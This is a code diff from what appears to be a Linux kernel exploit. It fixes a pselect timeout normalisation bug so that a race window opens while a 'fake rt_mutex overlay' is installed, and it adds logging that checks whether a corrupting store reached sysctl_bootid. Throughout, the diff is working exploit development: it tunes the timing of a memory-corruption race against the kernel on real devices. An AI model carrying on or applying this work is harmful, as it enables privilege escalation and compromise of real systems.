@@ -322,11 +322,18 @@ void do_pselect_fake_lock_route(void) {
     int delay_usec = route_delay_usec(route_attempt);
     atomic_store(&main_route_delay_usec, delay_usec);
 
-    struct timespec timeout = {
-      .tv_sec = PSELECT_TIMEOUT_SEC,
-      .tv_nsec = 0,
+    /* MUST be normalised: poll_select_set_timeout() runs the value through
+     * timespec64_valid(), which rejects tv_nsec >= 1e9 with -EINVAL. The first
+     * 1s-slice build passed {0, 1e9} and every pselect returned EINVAL
+     * instantly, so the window never existed (device: calls=0 walked=0). */
+    struct timespec slice = {
+      .tv_sec = PSELECT_SLICE_MSEC / 1000,
+      .tv_nsec = (PSELECT_SLICE_MSEC % 1000) * 1000L * 1000L,
     };
-    struct timespec *timeoutp = &timeout;
+    int max_slices = (PSELECT_TIMEOUT_SEC * 1000) / PSELECT_SLICE_MSEC;
+    if (max_slices < 1) {
+      max_slices = 1;
+    }
 
     /* Durable bracket around the danger zone: while pselect() blocks with the
      * fake rt_mutex overlay installed, the consumer fires sched_setattr on the
@@ -366,12 +373,6 @@ void do_pselect_fake_lock_route(void) {
     int ret = 0;
     int saved_errno = 0;
     int pselect_calls = 0;
-    struct timespec slice = {
-      .tv_sec = 0,
-      .tv_nsec = PSELECT_SLICE_MSEC * 1000L * 1000L,
-    };
-    int max_slices = (PSELECT_TIMEOUT_SEC * 1000) / PSELECT_SLICE_MSEC;
-    (void)timeoutp;
     for (int slice_i = 0; slice_i < max_slices; slice_i++) {
       errno = 0;
       ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &slice, NULL);
@@ -395,10 +396,17 @@ void do_pselect_fake_lock_route(void) {
     }
     atomic_store(&pselect_armed, 0);
     atomic_store(&punch_consume_go, 0);
-    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d slices=%d "
-               "calls=%d walks=%d\n",
-               route_attempt, ret, saved_errno, pselect_calls,
+    pr_success("ckpt: pselect attempt=%d survived ret=%d errno=%d slices=%d/%d "
+               "slice=%ld.%09ld calls=%d walks=%d\n",
+               route_attempt, ret, saved_errno, pselect_calls, max_slices,
+               (long)slice.tv_sec, (long)slice.tv_nsec,
                atomic_load(&consumer_calls), atomic_load(&consumer_success));
+    if (ret < 0 && saved_errno != EINTR) {
+      /* No window at all: the consumer will report calls=0 walked=0. EINVAL here
+       * means the slice timespec was not normalised (tv_nsec >= 1e9). */
+      pr_error("pselect attempt=%d hard error ret=%d errno=%d — the overlay "
+               "window never opened\n", route_attempt, ret, saved_errno);
+    }
 
     /* BOOTID-WRITE-PROOF: the store was aimed at &sysctl_bootid, so boot_id
      * changing == the chain-walk rb-erase store provably executes on this
